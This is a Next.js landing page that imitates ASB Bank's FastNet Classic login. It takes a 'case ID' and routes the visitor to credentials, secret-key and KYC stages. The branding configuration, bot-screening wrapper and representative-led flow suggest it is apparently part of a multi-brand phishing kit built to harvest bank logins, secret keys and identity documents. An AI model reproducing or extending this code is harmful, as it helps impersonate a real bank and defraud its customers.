'use client';

/**
 * ASB Bank Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 * ASB FastNet Classic design — dark theme with yellow accent
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2, Info } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      {/* ASB Header */}
      <header className="header">
        <div className="header-container">
          <a href="#" className="logo-link">
            <img src="/brands/asb/logo-asb.svg" alt="ASB Logo" className="logo" />
          </a>
        </div>
      </header>

      {/* Main content area */}
      <main className="main-content">
        <section className="login-section">
          <div className="login-container">
            <h1 className="page-title">Continue to FastNet Classic</h1>

            {/* Error Alert */}
            {fieldError && (
              <div className="alert-box">
                <AlertCircle className="alert-icon" />
                <span className="alert-text">{fieldError}</span>
              </div>
            )}

            <form className="login-form" onSubmit={handleSubmit} noValidate>
              {/* Case ID Field */}
              <div className="form-group">
                <label htmlFor="case-id" className="form-label">Case ID</label>
                <div className="input-wrapper">
                  <input
                    type="text"
                    id="case-id"
                    name="case-id"
                    className="form-input"
                    autoComplete="off"
                    style={{ paddingLeft: '16px' }}
                    value={caseId}
                    onChange={(e) => {
                      setCaseId(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isLoading}
                  />
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="submit-button"
                disabled={isLoading}
              >
                {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                {isLoading ? 'Verifying...' : 'Continue'}
              </button>
            </form>
          </div>
        </section>

        {/* Extra Info */}
        <div className="extra-info">
          <p className="not-customer">
            If you received a direct link from a representative, please use that link instead.
          </p>
          <p className="disclaimer">
            FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by
            ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised
            access is prohibited.
          </p>
        </div>
      </main>
    </BotGuard>
  );
}
